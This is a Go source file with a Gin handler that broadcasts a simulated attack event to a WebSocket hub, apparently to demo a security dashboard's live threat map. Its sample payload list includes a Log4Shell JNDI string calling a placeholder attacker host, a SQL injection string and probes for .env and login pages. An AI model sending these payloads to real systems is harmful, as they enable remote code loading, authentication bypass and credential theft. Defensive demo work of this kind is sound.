package server

import (
	"math/rand"
	"time"

	"github.com/gin-gonic/gin"
)

// SimulateAttack returns a Gin Handler that generates a fake attack event
// and shoves it directly into the WebSocket Hub, completely bypassing Postgres and the WAF Ban Hammer.
func SimulateAttack(hub *Hub) gin.HandlerFunc {
	return func(c *gin.Context) {
		// Randomized Cyber-Security Payloads
		payloads := []string{
			"GET /.env HTTP/1.1",
			"POST /wp-login.php HTTP/1.1",
			"${jndi:ldap://hacker.ru/Exploit}",
			"GET /api/users?id=1' OR '1'='1 --",
			"GET /config.json HTTP/1.1",
		}
		randomPayload := payloads[rand.Intn(len(payloads))]

		// Randomized Threat Locations (Major Cyber Hubs)
		locations := []struct {
			Country string
			City    string
			Lat     float64
			Lon     float64
		}{
			{"RU", "Moscow", 55.7558, 37.6173},
			{"CN", "Beijing", 39.9042, 116.4074},
			{"BR", "São Paulo", -23.5505, -46.6333},
			{"KP", "Pyongyang", 39.0392, 125.7625},
			{"IR", "Tehran", 35.6892, 51.3890},
			{"US", "Ashburn", 39.0438, -77.4874},
		}
		loc := locations[rand.Intn(len(locations))]

		// Construct the fake event structure
		fakeAttack := AttackEvent{
			IP:        "192.168.SIMULATED",
			Target:    "SIMULATION",
			Payload:   randomPayload,
			Timestamp: time.Now(),
			Country:   loc.Country,
			City:      loc.City,
			Lat:       loc.Lat,
			Lon:       loc.Lon,
		}

		// Inject directly into the Hub (O(1) WebSocket Push)
		hub.Broadcast <- fakeAttack

		c.JSON(200, gin.H{
			"status":  "success",
			"message": "Global Simulation Launched",
		})
	}
}
